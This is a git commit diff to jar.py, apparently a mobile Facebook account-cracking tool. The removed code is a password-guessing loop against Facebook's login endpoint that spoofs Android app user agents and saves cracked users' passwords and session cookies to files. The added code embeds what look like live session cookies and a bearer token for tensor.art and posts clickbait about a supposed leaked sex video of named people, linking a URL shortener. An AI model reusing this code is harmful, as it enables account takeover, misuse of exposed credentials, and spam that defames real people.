de005877e59031a9838b09e2d5f19b4a62c7e3f6
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-10-18 00:23:01 +0530

    Update jar.py

--- jar.py
+++ jar.py
@@ -456,93 +456,68 @@ def crackerr(ids,passlist):
     sys.stdout.flush()
     try:
         for pas in passlist:
-            #nip=random.choice(proxsi)
-            #proxs= {'http': 'socks4://'+nip}
-            moz = random.choice(usragt)
-            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
-            bv = f"{random.randint(1111111,7777777)}"
-            versi_android = f"{random.randint(6,14)}"
-            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
-            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
-            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
-            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
-            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
-            head = {"authority": "m.prod.facebook.com",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "dpr": "3",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "none",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": us,
-            "viewport-width": "980"}
-            free_fb = session.get(url1,headers=head).text
-            log_data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': ids,
-            'cred_type': '100',
-            'login_source': 'device_based_login_add_account',
-            'savepass': '',
-            'next': '',
-            'persistent': '',
-            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
-            url = "https://web.facebook.com/login/device-based/regular/login/"
+            cookies = {
+            '__cf_bm': 'qwoCilS0Bhpia4AmNczFtqx89ty4PUkGGfh6D7T_gSU-1760725346-1.0.1.1-80JNKM_Hpb7Xn57MGaNdTRfE7IwyJNaXFamdIfWdxuimoowJCQ9sRCU_2dMgDRqOGHMqiS_UpCsCoNi0i0CpCkuJDumXl_aSxcQhjAN82i8',
+            '_uetsid': '5098c220ab4711f0a1793b9f2c156966',
+            '_uetvid': '5098fac0ab4711f09628490ff22b64b2',
+            '_scid_r': 'KHTNLLppzbhWWyDqgrdvhfsJia24Y2BjTa983Q',
+            '_ga_3MT5TWB94N': 'GS2.1.s1760698322$o1$g1$t1760696490$j59$l0$h0',
+            '_fbp': 'fb.1.1760696621368.60970082052103756',
+            'sajssdk_2015_cross_new_user': '1',
+            '_ga': 'GA1.1.245810326.1760698323',
+            '_scid': 'BfTNLLppzbhWWyDqgrdvhfsJia24Y2Bj',
+            '_ScCbts': '%5B%5D',
+            '_sctr': '1%7C1760639400000',
+            'ta_token_prod': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjkyMTA0ODM4MzkxMTY4MDE0NiwiZGV2aWNlSWQiOiIiLCJyZWZyZXNoVG9rZW4iOiIiLCJleHBpcmVUaW1lIjoyNTkyMDAwLCJleHAiOjE3NjMzMTIyODh9.k0ARAAOdcjPIGhkmGvyKGXAyEjc0Ch7JRt0IkeuiXlNfbt9FE_cJLPkxUNLWOdUCKBU0FYfLx6QrcEIk_QCVLjloZrRPd47UxCBv5EuCgo9HkwYd53dp6X15setCDK-RSe9dsrEHMOhRQ_VtJ47Rofvd5grZr5V5YQ3LwBL0QB_SauyRaZNGuUGs7TeCGLuWxsVAiqxid70jHJr0Rs84O7RbOwUJKJxWgjneIGUcdIxqyjNRgww6U5JJuZX15OA-kuoyqg5wj0SnF1allCCIAs7w34Lw2mGX-jMcJR0yDnE7pVh3ToUpCIY4oNuVbckbVpnh2bUuPOuvkGNWL1XR_g',
+            'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%22921048383911680146%22%2C%22first_id%22%3A%22199f1cc4ddb2c3-0ff07a7c97fc118-26061851-1296000-199f1cc4ddc55d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTk5ZjFjYzRkZGIyYzMtMGZmMDdhN2M5N2ZjMTE4LTI2MDYxODUxLTEyOTYwMDAtMTk5ZjFjYzRkZGM1NWQiLCIkaWRlbnRpdHlfbG9naW5faWQiOiI5MjEwNDgzODM5MTE2ODAxNDYifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%22921048383911680146%22%7D%7D',
+            }
+
             headers = {
-            'user-agent': us,
-            'Accept-Encoding': 'gzip, deflate',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Connection': 'keep-alive',
-            'Host': 'x.prod.facebook.com',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '3',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'viewport-width': '980'}
-            response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
-            log_cookies = session.cookies.get_dict().keys()
-            if "c_user" in log_cookies:
-                kuki = convert(session.cookies.get_dict())
-                #kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
-                user = re.findall('c_user=(.*);xs', kuki)[0]
-                xs_value = None
-                for part in kuki.split(';'):
-                    if part.startswith('xs='):
-                        xs_value = part.split('=', 1)[1]
-                        break
-                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                    if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
-                    else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
-            elif "checkpoint" in log_cookies:
-                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
-                cps.append(ids)
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+            'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjkyMTA0ODM4MzkxMTY4MDE0NiwiZGV2aWNlSWQiOiIiLCJyZWZyZXNoVG9rZW4iOiIiLCJleHBpcmVUaW1lIjoyNTkyMDAwLCJleHAiOjE3NjMzMTIyODh9.k0ARAAOdcjPIGhkmGvyKGXAyEjc0Ch7JRt0IkeuiXlNfbt9FE_cJLPkxUNLWOdUCKBU0FYfLx6QrcEIk_QCVLjloZrRPd47UxCBv5EuCgo9HkwYd53dp6X15setCDK-RSe9dsrEHMOhRQ_VtJ47Rofvd5grZr5V5YQ3LwBL0QB_SauyRaZNGuUGs7TeCGLuWxsVAiqxid70jHJr0Rs84O7RbOwUJKJxWgjneIGUcdIxqyjNRgww6U5JJuZX15OA-kuoyqg5wj0SnF1allCCIAs7w34Lw2mGX-jMcJR0yDnE7pVh3ToUpCIY4oNuVbckbVpnh2bUuPOuvkGNWL1XR_g',
+            'content-type': 'application/json',
+            'origin': 'https://tensor.art',
+            'priority': 'u=1, i',
+            'referer': 'https://tensor.art/edit/article/921051555745016367',
+            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+            'x-echoing-env': '',
+            'x-request-package-id': '3000',
+            'x-request-package-sign-version': '0.0.1',
+            'x-request-sign': 'MzMyMGFjYzdmMGRjNjljOGJlMmJlZWRjMjg0NmVlNDhhZGUzMmMwZjhhZWZiNTVkZDIyZmJhMjVmOTZlODI3NQ==',
+            'x-request-sign-type': 'HMAC_SHA256',
+            'x-request-sign-version': 'v1',
+            'x-request-timestamp': '1760725671615',
+            # 'cookie': '__cf_bm=qwoCilS0Bhpia4AmNczFtqx89ty4PUkGGfh6D7T_gSU-1760725346-1.0.1.1-80JNKM_Hpb7Xn57MGaNdTRfE7IwyJNaXFamdIfWdxuimoowJCQ9sRCU_2dMgDRqOGHMqiS_UpCsCoNi0i0CpCkuJDumXl_aSxcQhjAN82i8; _uetsid=5098c220ab4711f0a1793b9f2c156966; _uetvid=5098fac0ab4711f09628490ff22b64b2; _scid_r=KHTNLLppzbhWWyDqgrdvhfsJia24Y2BjTa983Q; _ga_3MT5TWB94N=GS2.1.s1760698322$o1$g1$t1760696490$j59$l0$h0; _fbp=fb.1.1760696621368.60970082052103756; sajssdk_2015_cross_new_user=1; _ga=GA1.1.245810326.1760698323; _scid=BfTNLLppzbhWWyDqgrdvhfsJia24Y2Bj; _ScCbts=%5B%5D; _sctr=1%7C1760639400000; ta_token_prod=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjkyMTA0ODM4MzkxMTY4MDE0NiwiZGV2aWNlSWQiOiIiLCJyZWZyZXNoVG9rZW4iOiIiLCJleHBpcmVUaW1lIjoyNTkyMDAwLCJleHAiOjE3NjMzMTIyODh9.k0ARAAOdcjPIGhkmGvyKGXAyEjc0Ch7JRt0IkeuiXlNfbt9FE_cJLPkxUNLWOdUCKBU0FYfLx6QrcEIk_QCVLjloZrRPd47UxCBv5EuCgo9HkwYd53dp6X15setCDK-RSe9dsrEHMOhRQ_VtJ47Rofvd5grZr5V5YQ3LwBL0QB_SauyRaZNGuUGs7TeCGLuWxsVAiqxid70jHJr0Rs84O7RbOwUJKJxWgjneIGUcdIxqyjNRgww6U5JJuZX15OA-kuoyqg5wj0SnF1allCCIAs7w34Lw2mGX-jMcJR0yDnE7pVh3ToUpCIY4oNuVbckbVpnh2bUuPOuvkGNWL1XR_g; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22921048383911680146%22%2C%22first_id%22%3A%22199f1cc4ddb2c3-0ff07a7c97fc118-26061851-1296000-199f1cc4ddc55d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTk5ZjFjYzRkZGIyYzMtMGZmMDdhN2M5N2ZjMTE4LTI2MDYxODUxLTEyOTYwMDAtMTk5ZjFjYzRkZGM1NWQiLCIkaWRlbnRpdHlfbG9naW5faWQiOiI5MjEwNDgzODM5MTE2ODAxNDYifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%22921048383911680146%22%7D%7D',
+            }
+
+            json_data = {
+    'postId': '921051555745016367',
+    'title': 'viral de Yailin Viral y Sr Jimenez XXX VIDEOS',
+    'content': '<h1 id="heading-1-DjDbBqBSMZ"><strong><em>El video </em></strong><a target="_blank" rel="noopener noreferrer nofollow" href="https://tinyurl.com/mtmk2db8"><strong><em>viral </em></strong></a><strong><em>de Yailin Viral y Sr</em></strong></h1><p>El reciente video filtrado de Yailin y el Sr. Jiménez ha generado una gran ola de reacciones</p><p></p>',
+    'tags': [
+        'WORKFLOWS',
+    ],
+    'cover': {
+        'postImageId': '921051509574085469',
+    },
+    'postImageIds': [
+        '921051509574085469',
+        '921051509574085469',
+    ],
+}
+
+            response = requests.post('https://api.tensor.art/community-web/v1/post/update', cookies=cookies, headers=headers, json=json_data)
+            result = response.json()
+            if result.get("code") == 0 or result.get("message") == "success":
+                print('\033[1;91m [okk] ')
+                oks.append(ids)
                 break
             else:continue
         loop+=1
